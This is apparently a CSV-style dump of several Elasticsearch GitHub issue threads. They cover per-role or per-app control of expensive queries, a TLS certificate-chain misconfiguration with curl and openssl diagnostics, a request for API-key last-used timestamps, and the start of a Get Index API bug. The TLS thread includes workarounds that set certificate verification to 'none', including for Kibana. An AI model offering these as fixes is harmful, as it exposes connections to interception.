The concern is that Security and Observability use cases would have a mandatory requirement to run expensive queries for some of their tasks, forcing the new setting to stay disabled since it is global.
The proposal allows to give ""expensive"" privileges to those tasks, and to limit other accesses.

I would avoid an ad-hoc solution that would not solve the underlying problem — per-user resource quota limits, unless there are strong implications that can make this an exception, for example strong impact on Solutions use cases.

Moving cluster settings into privileges, or using privileges to limit resource usage would require a more generic approach since it would be applied to many similar cases, with a consequent higher technical effort.

Could you help defining if Solutions would be able to use the current feature as cluster setting or not? This is a key point to me.

@sorantis @MikePaquette you may be interested to chime in here and add your point of view.To pick a concrete example, assuming many security and observability use cases must use options like wildcard queries or script score queries (or other queries mentioned in [#51385](https://github.com/elastic/elasticsearch/pull/51385), would this feature become more useful for security and observability if we enable allow_expensive_query per role? Alternatively would a more fine grain control be useful for security and observability (see [52337](https://github.com/elastic/elasticsearch/issues/52337))? 
@sorantis @MikePaquette My concern is that the seems like a potential mismatch between the proposed solution (per role) and the purposes for needing this (supporting security & observability).

Most security & observability searches happen in real time inside Kibana. I am working on the assumption that the needed ""expensive queries"" fall into that category.
If that's the case, then the queries run in the context of the user who is logged in to Kibana. So it means that if SIEM needs expensive queries, then _every user who uses SIEM_ needs to be allowed to run expensive queries, _all the time_. Since the proposal is a per-role flag, it would mean it follows a user around in every context - so if you can run expensive queries in SIEM you can also run expensive queries in Kibana Dev Tools.

It sounds more like we need something that is per-app, not per-user/role. So you can run expensive queries _inside SIEM_ but not _inside Dev Tools_.

Perhaps we've misunderstood the proposal, and if so please let us know, but it doesn't sounds like a per-role flag actually helps here.

Which is not to say that per-user resource limits are a bad thing - it's entirely reasonable to have a ""power users"" flag that would allow some people to run expensive queries and not others, but I don't think such a flag helps SIEM/ Observability very much.


 Having the limitation per user and app makes sense to me - these are complementing, not contradicting. I would think that in some situations only some of the users will get access to some of the expensive queries, so RBAC can be beneficial.Here are some thoughts after @giladgal and I discussed a bit more about this topic.

**Per-user limits**: they are good if you want to limit ""new users"", and remove the limit when they are more experienced and you trust they will not kill the system with expensive queries.

The problem with per-user limits is that we don't expect users of a specific app to become knowledgeable about problems of expensive queries, even after they get onboarded.
For example, SIEM users should be pro in threat hunting using the SIEM interface, but they don't need to know and focus on which are the queries that bring data there. You also cannot forbid new security specialists to use the SIEM interface on their first day, as this is a mandatory part of their job.

This would make necessary to guarantee the expensive query capability to all SIEM users.
If we consider a standard use case, most of the users will be tied to a specific solution, and so they will need the permission to run expensive queries to do their job.
Users that don't fall into ""solution users"" will be data and system admins, and those are not good candidates to be limited as we may expect they know what they are doing.

In conclusion, every user in the system will have the permission to run expensive queries, making the feature not really useful.

**Per-app limits**: they are good if you want to allow expensive queries in a ""controlled"" environment only (e.g. SIEM), where queries are not arbitrary and they are unlikely to harm the system.

In this case we can allow queries coming from solutions apps (like SIEM), as they don't allow users to unintentionally kill the system. If the user performs arbitrary expensive queries, for example via dev console or directly to the ES API endpoint, it will be denied.
The problem here is that Elasticsearch needs a way to know which is the app that is performing the query. If the app uses users' credentials, this information is not available, and the check cannot be done as Elasticsearch will see it coming from the user.

We discussed the following approaches, that require more investigation.

Allow a fine-grained selection of expensive query types that can be allowed/forbidden (see the list [here](https://github.com/elastic/elasticsearch/pull/51385)). This will work only if apps (like SIEM) use a few types, so we can block everything else. Complexity increases, and it would not fully solve the problem as users would be able to use those types of expensive queries from other places like dev tools.

Perform a combination of per-user and per-app checks. This works if each app has its own ""system user"" (or API key), and all the queries are performed in a way that credentials for both the system user and the interactive user are sent to Elasticsearch. It could then validate that the request is coming from a specific app (via system user credentials) and for a specific user (via interactive user credentials). The app will be authorized to perform expensive queries with the privileges of the user, in order to guarantee proper data access.

This approach requires a very specific setup for how apps perform queries, and I suspect that it cannot be done with the current implementation and would require more thoughts.

The next step to better define the requirements is to check with Solutions:
1. which kind of expensive queries they leverage
1. which are the credentials that are used to execute those queries

Feel free to comment/add/validate if I've missed something.Looking at this problem from a different angle: if we assume that we want to limit ""unintended misuses"" of expensive queries only, instead of ""malicious users"", we can probably come to a simpler solution.

We can see if Kibana feature control can help. For example, allow/block expensive queries in Discovery and Dev Tools based on the user, allow for all in SIEM.

Kibana can then set an additional header to the REST call to Elasticsearch to tell if the expensive query protection should be done or not for that specific request. The same approach could be used by any other client (e.g. Solutions or custom apps).

This will not guarantee users will not do expensive queries by adding the required header, but as said before it would solve the ""unintended misuse"" scenario pretty well.@arisonl could you take a look and give some feedback on the feasibility of the proposal on the Kibana side?
We still don't know if we need to do it, but a preliminary check may be helpful.

Thanks!In the context of runtime fields, per-role enablement of expensive queries (or heck, just the ability to define runtime fields at all) is an important feature in many orgs where the users are not the cluster owners. 

The ""unintended misuse"" and ""uneducated misuse"" (i.e. someone without enough knowledge of ES and data query in general to knowingly intend or unknowingly not intend an expensive query) are questions I'm getting often w.r.t. just regular Kibana querying (searching for `*root*` over last 5 years in a +1PB cluster).

big ++ on per role permission for expensive queries.@mbarretta  are you after preventing some users from defining runtime fields, I would assume in the search request as well as in the index mappings, or preventing some users from using runtime fields in their queries/aggs etc as part of the search API? It is subtle, but leaning on role permissions for expensive queries may end up addressing the latter but not the former. @javanna In general, the ""uneducated misuse"" folk that I'm describing will never define runtime fields using an API. It's all about shutting them out from wherever it's possible within Kibana that isn't already controlled by RBAC (index settings for example). So maybe my comment is better added to a Kibana ticket that would hide/disable things, though would expect they'll need privileges on which to makes those decisions.One more related requirement is the ability to use runtime fields when searching system indices.  At the moment we cannot do this, because then our internal functionality would then break if somebody sets `search.allow_expensive_queries: false`.

With system indices there is some protection against the ""expensive"" aspect because we can ensure that we search indexed fields to narrow down the set of documents that runtime fields need to be calculated for to just a handful.

Many of the proposed remedies in this issue could meet this requirement, e.g. special header on the request, new privilege, per-app limits.  But please can you make sure whichever one is eventually chosen also works for the use case of internal searches done from within Elasticsearch features always being able to do ""expensive"" queries.The cluster-wide `search.allow_expensive_queries` is causing issues for Kibana. For example, https://github.com/elastic/kibana/issues/111031. If we were to keep looking, I think we'd uncover additional Kibana features that have been broken by the introduction of this setting.

If we had the ability to allow the `kibana_system` user the ability to execute expensive queries, this would solve our issues when users have enabled authc/authz. However, when users aren't using authc/authz, this will continue to break Kibana features.Is there anything we can do to identify those queries and remove them from the list of what's considered ""expensive""? Are those expensive (but required), or just falling in that category even if cheap?

We discussed about resource limits in the past, but this seems a compelling problem that should be solved soon.@bytebilly the situations that I'm aware of where Kibana is using ""expensive"" queries is whenever Kibana uses a scripted query. It's theoretically possible for Kibana to no longer use scripted ES queries; however, Kibana would be stuck implementing the same logic in Kibana code, which would just make the operation take longer because of network latency.Somewhat related: Is there an option to set the option per request? I'm exposing a query-string query via a HTTP API and it would be helpful if I could set the field myself for each request (because some users should be allowed to run expensive queries).",no,":Search/Search,:Security/Security,Team:Search,Team:Security,"
elastic/elasticsearch,337476951,"Elasticsearch X-Pack valid ssl certificate not trusted by client because ca chain not provided by server.","<!--

** Please read the guidelines below. **

Issues that do not follow these guidelines are likely to be closed.

1.  GitHub is reserved for bug reports and feature requests. The best place to
    ask a general question is at the Elastic [forums](https://discuss.elastic.co).
    GitHub is not the place for general questions.

2.  Is this bug report or feature request for a supported OS? If not, it
    is likely to be closed.  See https://www.elastic.co/support/matrix#show_os

3.  Please fill out EITHER the feature request block or the bug report block
    below, and delete the other block.

-->

<!-- Feature request -->

**Describe the feature**: 
Elasticsearch x-pack security settings

<!-- Bug report -->

**Elasticsearch version** (`bin/elasticsearch --version`): 
./elasticsearch --version
Version: 6.2.0, Build: 37cdac1/2018-02-01T17:31:12.527918Z, JVM: 1.8.0_171

**Plugins installed**: []
**./elasticsearch-plugin list**
```
repository-s3
x-pack
	x-pack-core
	x-pack-deprecation
	x-pack-graph
	x-pack-logstash
	x-pack-ml
	x-pack-monitoring
	x-pack-security
	x-pack-upgrade
	x-pack-watcher

```

**JVM version** (`java -version`):
**java -version**
```
openjdk version ""1.8.0_171""
OpenJDK Runtime Environment (build 1.8.0_171-b10)
OpenJDK 64-Bit Server VM (build 25.171-b10, mixed mode)

```

**OS version** (`uname -a` if on a Unix-like system):
**uname -a**
`Linux node1.elasticsearch.paris.sasstacloud.sascloud.io 3.10.0-862.6.3.el7.x86_64 #1 SMP Fri Jun 15 17:57:37 EDT 2018 x86_64 x86_64 x86_64 GNU/Linux
`

**Description of the problem including expected versus actual behavior**:
Valid SSL certificates provided by elasticseach nodes not trusted.
**Steps to reproduce**:

1. Install and configure x-pack security to enable http transport over ssl. 
2. Use a valid ssl certificate signed by a trusted CA. Let's Encrypt this my case.
3. Perform any https request on elasticsearch api

**Here is the elasticsearch x-pack configuration we set:**
```
xpack.security.enabled: true
xpack.ssl.verification_mode: none
xpack.security.http.ssl.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.transport.ssl.verification_mode: certificate 
xpack.security.http.ssl.verification_mode: certificate 
xpack.security.http.ssl.key: /etc/elasticsearch/tls/node.key
xpack.security.http.ssl.certificate: /etc/elasticsearch/tls/node.cer
xpack.security.http.ssl.certificate_authorities: [ ""/etc/elasticsearch/tls/chain.cer"" ] 
xpack.security.transport.ssl.key: /etc/elasticsearch/tls/node.key
xpack.security.transport.ssl.certificate: /etc/elasticsearch/tls/node.cer 
xpack.security.transport.ssl.certificate_authorities: [ ""/etc/elasticsearch/tls/chain.cer"" ]

```

**Then preform an https request on elasticsearch**
```
sh-4.2# curl -v https://elasticsearch.paris.sasstacloud.sascloud.io:9200
* About to connect() to elasticsearch.paris.sasstacloud.sascloud.io port 9200 (#0)
*   Trying 10.145.30.94...
* Connected to elasticsearch.paris.sasstacloud.sascloud.io (10.145.30.94) port 9200 (#0)
* Initializing NSS with certpath: sql:/etc/pki/nssdb
*   CAfile: /etc/pki/tls/certs/ca-bundle.crt
  CApath: none
* Server certificate:
*       subject: CN=elasticsearch.paris.sasstacloud.sascloud.io
*       start date: Jun 29 13:50:01 2018 GMT
*       expire date: Sep 27 13:50:01 2018 GMT
*       common name: elasticsearch.paris.sasstacloud.sascloud.io
*       issuer: CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US
*** NSS error -8179 (SEC_ERROR_UNKNOWN_ISSUER)
* Peer's Certificate issuer is not recognized.
* Closing connection 0**
curl: (60) Peer's Certificate issuer is not recognized.
More details here: http://curl.haxx.se/docs/sslcerts.html

curl performs SSL certificate verification by default, using a ""bundle""
 of Certificate Authority (CA) public keys (CA certs). If the default
 bundle file isn't adequate, you can specify an alternate file
 using the --cacert option.
If this HTTPS server uses a certificate signed by a CA represented in
 the bundle, the certificate verification probably failed due to a
 problem with the certificate (it might be expired, or the name might
 not match the domain name in the URL).
If you'd like to turn off curl's verification of the certificate, use
 the -k (or --insecure) option.
```

**But with any other web browser performing the same https request, the ssl certificate is trusted and valid:**
![image](https://user-images.githubusercontent.com/16941317/42160402-4d5c559c-7df7-11e8-93d8-3f24c6b65b5c.png)

**Here is the output of a request done using the openssl s_client:**
 ```
sh-4.2# openssl s_client -showcerts -host elasticsearch.paris.sasstacloud.sascloud.io -port 9200
CONNECTED(00000003)
**depth=0 CN = elasticsearch.paris.sasstacloud.sascloud.io
verify error:num=20:unable to get local issuer certificate**
verify return:1
depth=0 CN = elasticsearch.paris.sasstacloud.sascloud.io
verify error:num=21:unable to verify the first certificate
verify return:1
---
Certificate chain
 0 s:/CN=elasticsearch.paris.sasstacloud.sascloud.io
   i:/C=US/O=Let's Encrypt/CN=Let's Encrypt Authority X3
-----BEGIN CERTIFICATE-----
MIIGQDCCBSigAwIBAgISA5tWGfplAZn411Je7YlKU1+lMA0GCSqGSIb3DQEBCwUA
MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD
ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0xODA2MjkxMzUwMDFaFw0x
ODA5MjcxMzUwMDFaMDYxNDAyBgNVBAMTK2VsYXN0aWNzZWFyY2gucGFyaXMuc2Fz
c3RhY2xvdWQuc2FzY2xvdWQuaW8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQDB8VvUxHHiuJ13UO+OEVrdLW4nNmBrnA7eOm9TM46Z5EBzHyV2WO9x3F9k
cFSQ4BQ4jmig0JT3XU7hmqZXg5bQN2fL4/px1GtEb3O+/YgjVk2J0N9RC56iUqJS
TN9FmfJcAQPck1QA8OC2yVqB7SqnYJsg4wUUGMoZumtIaHvIZZ9XeTQzg8/Y5aP6
zjN5cuuVlPPXxFLfPJlK+WgwsIHUkKSvP5kA8ds4HLsc0NTRWGpHGMCwDGRFxYa3
sMn6LHzntdWgvcTcxHVUSJBKcS6gX8djLHOtLg81tWDSbaT973C34cP/uD8ATLQv
llBE5lN8GTQoIHcDNw9xOKJymIW9AgMBAAGjggMyMIIDLjAOBgNVHQ8BAf8EBAMC
BaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAw
HQYDVR0OBBYEFPd2Qva6TUxC2F2juR7PDlbsOu1sMB8GA1UdIwQYMBaAFKhKamME
fd265tE5t6ZFZe/zqOyhMG8GCCsGAQUFBwEBBGMwYTAuBggrBgEFBQcwAYYiaHR0
cDovL29jc3AuaW50LXgzLmxldHNlbmNyeXB0Lm9yZzAvBggrBgEFBQcwAoYjaHR0
cDovL2NlcnQuaW50LXgzLmxldHNlbmNyeXB0Lm9yZy8wNgYDVR0RBC8wLYIrZWxh
c3RpY3NlYXJjaC5wYXJpcy5zYXNzdGFjbG91ZC5zYXNjbG91ZC5pbzCB/gYDVR0g
BIH2MIHzMAgGBmeBDAECATCB5gYLKwYBBAGC3xMBAQEwgdYwJgYIKwYBBQUHAgEW
Gmh0dHA6Ly9jcHMubGV0c2VuY3J5cHQub3JnMIGrBggrBgEFBQcCAjCBngyBm1Ro
aXMgQ2VydGlmaWNhdGUgbWF5IG9ubHkgYmUgcmVsaWVkIHVwb24gYnkgUmVseWlu
ZyBQYXJ0aWVzIGFuZCBvbmx5IGluIGFjY29yZGFuY2Ugd2l0aCB0aGUgQ2VydGlm
aWNhdGUgUG9saWN5IGZvdW5kIGF0IGh0dHBzOi8vbGV0c2VuY3J5cHQub3JnL3Jl
cG9zaXRvcnkvMIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYAKTxRllTIOWW6qlD8
WAfUt2+/WHopctykwwz05UVH9HgAAAFkTAW9EgAABAMARzBFAiEAlnV+V2m9j/CT
bHEcFrcsobQyUALSsvkiBbnnlwYqDVoCIHK1gSs9m0nv/dOSH9j+HSi8K1/Oot4v
G3Fzvjpg7mqoAHUAb1N2rDHwMRnYmQCkURX/dxUcEdkCwQApBo2yCJo32RMAAAFk
TAW/kwAABAMARjBEAiEAoRwpjrISarna6VR/sAIyTGblLMgrdtXecHnoBDCI9kQC
HxVeFSFyrMYlNW7P8Nv0B3cnp17uBEdNnK9q389xFGIwDQYJKoZIhvcNAQELBQAD
ggEBADjLPWWvCEdRUkl59OcMb+EucvRwYlKrSjWkBbVH98m/z+R3ipI5/ufnCafj
Ho4wGwTQ1P2j6r/k5sC3TK5FjgmY32Cj7sZvBoGLq2i0wOrUhwG2kGohXCguypgm
wgLqgMxpe1qzYAXncunS00vWj+a1nhEgsJ+ZE6EqdsbzsSKBLtwCyqmgVwxSh5g6
iGTPg8C8iUT485+t83WKlt6APlBCU6SAE5knXBfhDv36UW1IBkGbTBqqarHieDrA
M58FKSSabyggyAZX/QB3LBzKFdI9bw26lf3GHqcdYuO6/IrIkoi6dRX2OMegy2Np
tZ5uxITgfgC1gfwj5qcBNvLFV9k=
-----END CERTIFICATE-----
---
Server certificate
subject=/CN=elasticsearch.paris.sasstacloud.sascloud.io
issuer=/C=US/O=Let's Encrypt/CN=Let's Encrypt Authority X3
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 2144 bytes and written 471 bytes
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-SHA384
    Session-ID: 5B36579BE33DD71E277BD8D376C507CC9136B7A80C98FE05DEC3C6D34B9EB939
    Session-ID-ctx:
    Master-Key: 89962CACF8AE173D264A169C31ED47BA1DE00034D11173CEE4B8BAEF4C6A07E8C847F42F5F2641B856B8ABA13FED86DF
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    Start Time: 1530288029
    Timeout   : 300 (sec)
    Verify return code: 21 (unable to verify the first certificate)

```


> The problem seems to be due to a bad behavior of elastaicsearch which doesn't send the entire certificate chain during the handshake making the client unable to validate the intermediate certificates.


**To workaround the problem we applied the following configuration:**
```
xpack.security.enabled: true
xpack.ssl.verification_mode: none
xpack.security.http.ssl.enabled: true
xpack.security.transport.ssl.enabled: true
xpack.security.transport.ssl.verification_mode: certificate 
xpack.security.http.ssl.verification_mode: certificate 
xpack.security.http.ssl.key: /etc/elasticsearch/tls/node.key
xpack.security.http.ssl.certificate: /etc/elasticsearch/tls/chain.cer
xpack.security.http.ssl.certificate_authorities: [ ""/etc/elasticsearch/tls/chain.cer"" ] 
xpack.security.transport.ssl.key: /etc/elasticsearch/tls/node.key
xpack.security.transport.ssl.certificate: /etc/elasticsearch/tls/node.cer 
xpack.security.transport.ssl.certificate_authorities: [ ""/etc/elasticsearch/tls/chain.cer"" ]

```
replaced:
      **xpack.security.http.ssl.certificate: /etc/elasticsearch/tls/node.cer**
by:
      **xpack.security.http.ssl.certificate: /etc/elasticsearch/tls/chain.cer**
 
> **We basically defined the full ssl chain ca as the ssl certificate. This make elasticsearch sending the full ca chain including the ssl certificate to the client during the ssl handshake.**




","Pinging @elastic/es-security> The problem seems to be due to a bad behavior of elastaicsearch which doesn't send the entire certificate chain during the handshake making the client unable to validate the intermediate certificates.

Is it really an ES problem? Because I understand that you only configure a `node.cer` instead of `chain.cer`. 
The file contents of the setting `certificate` is sent as is during handshake. The `certificate_authorities` setting is used only to validate authenticated clients (browser certificate) during handshake.@csahli  I am going to speculatively close this by pointing to the manual:
https://www.elastic.co/guide/en/elasticsearch/reference/6.2/configuring-tls.html#tls-http

Please do reopen if it appears that I'm mistaking.Thank you for your support but I am not able to reopen a closed issue. I am afraid I didn't explain correctly the issue. According to the manual which I followed to configure x-pack, you can provide the ssl certificate using 2 distinct formats: pkcs12 or pem.
I am using pem format as defined in the manual.

**Extract from the manual:**
```
xpack.security.http.ssl.enabled: true
xpack.security.http.ssl.key:  /home/es/config/x-pack/node01.key 
xpack.security.http.ssl.certificate: /home/es/config/x-pack/node01.crt 
xpack.security.http.ssl.certificate_authorities: [ ""/home/es/config/x-pack/ca.crt"" ] 
```
_**xpack.security.http.ssl.key**_: The full path to the node key file.
_**xpack.security.http.ssl.certificate**_: The full path to the node certificate.
_**xpack.security.http.ssl.certificate_authorities**_: An array of paths to the CA certificates that should be trusted.

The ssl client certificate is a file containing a public key generated by a client using its private key and signed by a CA. The client certificate is not suppose to contain the CA Chain. Providing the CA chain instead of the client certificate is unexpected behavior. Elasticsearch should instead discover the Intermediate CA using the CA cert or the CA chain and send the chain during the ssl handshake.
 I review your answer and I think you may be misunderstood my issue. To workaround the issue we used the CA Full chain as value of the **_xpack.security.http.ssl.certificate_** parameter. According to the configuration manual you shared, this parameter is supposed to be used to set the SSL cert not the Full CA Chain. If this is an expected behavior, you should update the manual to reflect that.

**_xpack.security.http.ssl.certificate_**: The full path to the node certificate.
should then be
**_xpack.security.http.ssl.certificate_**: The full path to the full ca chain.@csahli,
Thanks for the detailed diagnosis. For future such issues, it is better to reach out to https://discuss.elastic.co/c/elasticsearch . It has higher reach, so more people can chime in, and there is a good chance a similar issue came around before.

I think I understand the issue, but I jumped the gun without a proper detailed answer, apologies.

Your last comment spells the problem. Indeed the `xpack.security.http.ssl.certificate` setting should contain a chain.

-----

For completeness:

> Elasticsearch should instead discover the Intermediate CA using the CA cert or the CA chain and send the chain during the ssl handshake.

Elasticsearch does not, and it would be shoddy, to ""generate"" chains. It simply forwards the contents of the `xpack.security.http.ssl.certificate` file.

The browser, you say, validates the certificate, however curl trips. Following is an excerpt of the curl failure:
```
More details here: http://curl.haxx.se/docs/sslcerts.html

curl performs SSL certificate verification by default, using a ""bundle""
 of Certificate Authority (CA) public keys (CA certs). If the default
 bundle file isn't adequate, you can specify an alternate file
 using the --cacert option.
```
Elasticsearch sends the same certificate (chain) to both the browser and curl.  A TLS party does not ""construct"" chains for the other to trust. It sends what it got, and hopes the other will trust it. The browser trusts it, but curl does not. From the excerpt, I would try to add the Let's encrypt CA with the --cacert option. There are other ways as well (curl follows some env vars to the system level truststore).

------

I will open a docs PR about the `*.certificate` settings to be more on the lines of:
https://nginx.org/en/docs/http/ngx_http_ssl_module.html#ssl_certificate , ie `Specifies a file with the certificate in the PEM format for the given virtual server. If intermediate certificates should be specified in addition to a primary certificate, they should be specified in the same file in the following order: the primary certificate comes first, then the intermediate certificates.`
at least for https.

Does this sound fair to you, @csahli ?@albertzaharovits Thank you for you reactivity. I am totally ok with your proposal of updating the documentation to reflect nginx approach. 

There is another approach which is clearly more expensive ... It would consist in adding a new parameter
**_xpack.security.http.ssl.certificate_chain_** for CA chain or CA bundle and changing the parameter **_xpack.security.http.ssl.certificate_authorities_**  to **_xpack.security.http.ssl.trusted_certificate_authorities_**

However openssl terminology is clear: ssl cert, ssl bundle and ssl chain are 3 distinct things with distincts roles. And for server side encryption, this is the server role to provide the chain of trust. No matter if the server has to discover or generate it. If the chain is not provided by the server and the client refuses the ssl handshake, this is a server issue not a client issue. Nginx added the comment you mentioned on their documentation because they understand they don't respect openssl terminology. 

Thank you for your kind support and for your timeThanks for these suggestions @csahli , much appreciated.
@tvernum is more versed on matters as such. Sure he'll enjoy this banter 😄 > However openssl terminology is clear

but we're not using openssl, and openssl doesn't define the TLS standards (thankfully).

Your point about the documentation being unclear is fair. Getting TLS docs correct is a difficult balancing act - most users just want step by step instructions and don't really want to have to get into details that don't concern them. We intentionally leave out some finer details from those docs because if we put everything in then the docs would be so long that it would scare people off. I agree that they're not quite right here, and we'll work out what we can do to overcome that, but I hope you understand that what you were reading is a guide to setting up TLS, not a full reference, so it's never going to be able to answer every scenario.

The [settings reference](https://www.elastic.co/guide/en/elasticsearch/reference/6.2/security-settings.html#_pem_encoded_files_3) actually says:
> `xpack.security.http.ssl.certificate`
>    Path to a PEM encoded file containing the certificate (or certificate chain) that will be presented when requested.  

So in summary:
- The current behaviour is intentional
- It is possible to do everything you need to do within the current behaviour
- The documentation doesn't make that clear enough, and we'll try and improve it.
- If we were designing the settings from scratch then we might name them differently, but any change we made here would break existing configurations and I don't think there is sufficient value to justify that level of pain for existing users.[doc issue triage]@csahli *THANK YOU!!!* I've been confused in the last few hours and you saved me!

> I review your answer and I think you may be misunderstood my issue. To workaround the issue we used the CA Full chain as value of the **_xpack.security.http.ssl.certificate_** parameter. According to the configuration manual you shared, this parameter is supposed to be used to set the SSL cert not the Full CA Chain. If this is an expected behavior, you should update the manual to reflect that.
> 
> **_xpack.security.http.ssl.certificate_**: The full path to the node certificate.
> should then be
> **_xpack.security.http.ssl.certificate_**: The full path to the full ca chain.

**Update:** Although `curl` works, Kibana still won't connect to my elasticsearch node:

```
kib01    | {""type"":""log"",""@timestamp"":""2020-03-26T20:13:24Z"",""tags"":[""error"",""elasticsearch"",""admin""],""pid"":6,""message"":""Request error, retrying\nGET https://es01-SOMEDOMAIN:9243/_nodes?filter_path=nodes.*.version%2Cnodes.*.http.publish_address%2Cnodes.*.ip => unable to get issuer certificate""}
```

Workaround:

in `elastic-docker-tls.yml`:

```yaml
services:
  kib01:
    environment:
      ELASTICSEARCH_SSL_VERIFICATIONMODE: none
```@csahli , @ceefour , let me add a few quick comments here:

I think there's no need to add the `entire / full` chain (including the root CA) into the server certificate setting. The best practice here (in my view) is to set the `certificate` with a chain including your `server certificate` + `all intermediate CAs you might have` but not the `root CA`, as that one is actually useless at this level. I usually call this cert chain the `""server cert chain""`.

With that server chain, `curl` command should work fine (assuming the `root CA` is a public CA and part of the OS list of installed CAs), and if it doesn't work providing the `ca-chain` in the `--cacert` parameter should make it working (see `what to trust` section below).

Setting the server `certificate` with just the server certificate is also possible, but then you need to make sure that your clients know all the intermediate and root CAs. Some `smart` clients like web browsers are able to fetch directly the intermediate CAs and do the process of validation smoother, but some other clients like `curl` will never do that. I always try to make a setup for all clients to work without needing to provide the intermediate CAs, that's the reason of my proposal.

But as Tim mentioned, there isn't any standard defined for this.

On the other side, on the `what to trust` side (truststore), we could provide the client with `only the root CA` (which might work if the server is providing the intermediate CAs together with its own certificate) or giving the client a cert chain including the `intermediate CAs + rootCA`. I like more this second approach. I think it's safer and I always try to implement it when possible. I call this chain the `ca-chain` (with all CAs needed to trust the certificate).

So, for the kibana configuration shared by @ceefour , the following should work too.
```
elasticsearch.ssl.certificateAuthorities: [""/path/to/ca-chain.pem""]
elasticsearch.ssl.verificationMode: ""certificate""
```

In summary:
- When intermediate CAs are in the game, configuring only the server cert at `server certificate` side and only the `rootCA` at `what to trust` side will tend to fail in many scenarios. Hence is better to add a `server-cert-chain.pem` configured at server side (but not the full chain).

All this is not really related with Elasticsearch, is more generic SSL stuff, so I don't know if we should include this in the docs. Probably not, or maybe a very short comment about it (add any intermediate CA together with the server certificate in the `certificate` setting).

If you continue having issues I guess we should move this to https://discuss.elastic.co/c/elasticsearchThanks for such a crystal clear comment @eedugon ! Thanks for such a crystal clear comment @eedugon ! @csahli Thank you from 2021. You just saved me a whole lot of effort. I've been poring over the documentation and couldn't understand why this wasn't working right. This made it crystal clear.> 



> > The problem seems to be due to a bad behavior of elastaicsearch which doesn't send the entire certificate chain during the handshake making the client unable to validate the intermediate certificates.
> 
> Is it really an ES problem? Because I understand that you only configure a `node.cer` instead of `chain.cer`. The file contents of the setting `certificate` is sent as is during handshake. The `certificate_authorities` setting is used only to validate authenticated clients (browser certificate) during handshake.

I do not think it is a mutualTLS handshake, why does es validate the client with its own ca certificate?
a common setting in a server side ssl configurate is a cerfiticate and a private key.you can see many examples in nginx conf",no,">docs,:Security/TLS,Team:Security,"
elastic/elasticsearch,594912228,"[API Keys] Last used","One of the advantages of API Keys to manage access control is that they are cheap to create and maintain, so you often end up creating several of them.

To aid in manage them, it's very useful to know when an API Key was last used.

Other systems have this kind of feature and it proves indispensable in maintaining tight access control and good API Key hygiene. Without last used, retiring an API Key can be problematic and users will often postpone doing it because they cannot determine the ramifications.","@roncohen What level of resolution would you think is appropriate here? For example, is hourly okay? Without this, we end up making an update on *every* access, which would become expensive.Pinging @elastic/es-security (:Security/Authentication)@jasontedor I think hourly as a start would be perfectly fine. Even daily, if that helps. @roncohen there are a few questions that may help to better understand the use case and how this feature can contribute to Fleet.

Updating the timestamp on each request could have bad performance implications, and updating it on a timely basis (e.g. every 24h) sounds a bit strange to me.
I see feasible that users are fine seeing (2 days ago, 4 months ago, etc), but I suspect the precision of the timestamp should be at least minutes, since it makes sense for the immediate. If I'm monitoring an active agent, I want to know if it connected a minute ago or 5 hours ago.

In general, which is a good interval to consider an API key ""dismissed""? Since they can be used on endpoints, the uptime is very difficult to predict.

This is what I envision in the Fleet use case: users are looking at the dashboard where agents are listed, and they want to know if agents are still active or if they suffered major problems and so need maintenance (e.g. cannot connect). Is this the user problem that we want to solve?

In this case, I suppose that we want to track the management connection rather than the ingest connection. Or even better, track the Agent status since there should be no need for users to deal with API keys directly.

Does it make sense to you?In APM, [API Keys](https://www.elastic.co/guide/en/apm/server/7.7/api-key.html) are used to verify agent access to APM Server capabilities  - they are application keys with no Elasticsearch cluster or index privileges.  In this case, users directly deal with API keys and would benefit from having last used information for various reasons, but primarily as a check on their key rotation processes, to provide confidence that a particular key can be disabled.

> Updating the timestamp on each request could have bad performance implications, and updating it on a timely basis (e.g. every 24h) sounds a bit strange to me.

For APM, we're flexible on this.  Github [personal access tokens](https://github.com/settings/tokens) provide week granularity - a newly used one says `Less than a week ago`, I admit one of mine says `Less than 11 months ago` - I should probably disable it.  Just a hunch for now, but I  expect daily granularity would be plenty for the APM use case.@bytebilly This request isn't really related to Fleet.

In Fleet we are already keeping track of ""last seen"" etc. and because we have one API Key per agent to ingest data into Elasticsearch we can build a good user experience around managing Agents instead of API Keys.

This is a general feature that as a user I'd want to have in order to be able to better manage my API Keys. I think @graphaelli did a great job on explaining the use case for APM. Another example is if I as a user build a custom application, I'd want to use API Keys to connect to Elasticsearch. Here it would also be useful to be able to see which keys are still being used. 

> since it makes sense for the immediate

I don't know what you mean by this.Thanks both for your feedback, as discussed in the meeting we are not considering this as a blocker for Fleet but we'll investigate more in the future.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1382046511,"Get Index API returns no indices for a brief amount of time until indices are recovered into cluster_state","Tested on `8.5.0-SNAPSHOT` but I've also observed this behaviour on 8.4.1 clusters on Cloud.

## 1. Create a lot of indices
```
curl -s -k -X PUT ""http://elastic:changeme@localhost:9200/test[1-500]"" -H 'Content-Type: application/json'
```

## 2. Create a service token (seems to avoid 401 errors while .security is being restored?)
```
bin/elasticsearch-service-tokens create elastic/kibana mytoken
```

## 3. Start Elasticsearch and start polling the Get Index API:
```
for i in {1..10000}
do
    curl -k -w ""\n"" -X GET ""http://localhost:9200/.kibana,.kibana_8.4.1_001?ignore_unavailable=true&features=aliases"" -H 'Content-Type: application/json' -H 'Authorization: Bearer your_service_token'
done
```

## Results:
```
curl: (7) Failed to connect to localhost port 9200 after 2 ms: Connection refused

...

curl: (7) Failed to connect to localhost port 9200 after 3 ms: Connection refused
